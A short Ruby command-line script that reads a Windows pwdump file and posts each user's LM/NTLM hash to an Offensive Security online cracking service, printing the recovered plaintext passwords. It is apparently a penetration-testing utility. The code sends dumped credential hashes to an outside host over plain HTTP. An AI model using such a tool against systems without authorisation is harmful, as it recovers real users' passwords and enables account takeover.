#!/usr/bin/env ruby
# == offcrack.rb
#
# A command line wraper for cracker.offensive-security.com
#
# == Usage 
#  
# mping.sh -c [priority_code] pwdump_file
#   
# == Description 
# 
# Loop through a pwdump and lookup every hash using
# craker.offensive-security.com
# 
# Note: It doesn't support looking up for queued hashed 
#
# == Author 
# 
# Jerry Wozniak <jerry@pstree.org>
#
# == Version
# 
# offcrack-0.1
#
# == Created
#  
# 2013-10-01
#
#===================================================================================
require 'net/http'
require 'optparse'

options = {}

op = OptionParser.new do |opt|
  opt.banner = "Usage: #{File.basename($0)} [-c priority_code] pwdump_file"
  opt.separator("\nWhere available options:")
  opt.on("-c", "--code NUM", "Priority code assigned by Offsec") { |c| options[:code] = c    }
  opt.on("-v", "--verbose", "Verbose output")                    { options[:verbose]  = true }
  opt.on("-h", "--help", "Show this help")                       { puts opt; exit 1          }
  if ARGV.empty? 
    puts opt
    exit 1
  end
end
op.parse!

if ARGV.empty?
    puts "ERROR: Please specify the pwdump file with hashes"
    exit 1
end

#Defaults
uri = URI('http://cracker.offensive-security.com/insert.php')

pwdumpfile = ARGV.pop

pwdump = File.open(pwdumpfile)

pwdump.each do |line|
  pwfield = line.split(':')
  user = pwfield[0]
  hash = pwfield[2] + ':' + pwfield[3]
  print user + ':'
  res = Net::HTTP.post_form(uri, 'hash'     => hash,
                                 'type'     => 'lm',
                                 'method'   => 'table',
                                 'priority' => options[:code])
  if res.body.to_s.match('The plaintext is')
    print res.body.split(/- /)[1].split('<')[0]
  elsif res.body.to_s.match('queued')
    print ':QUEUED Please check the webiste manually)'
  else
    print ":ERROR #{res.code} #{res.message}" 
  end
  p res if options[:verbose]
  print "\n"
end
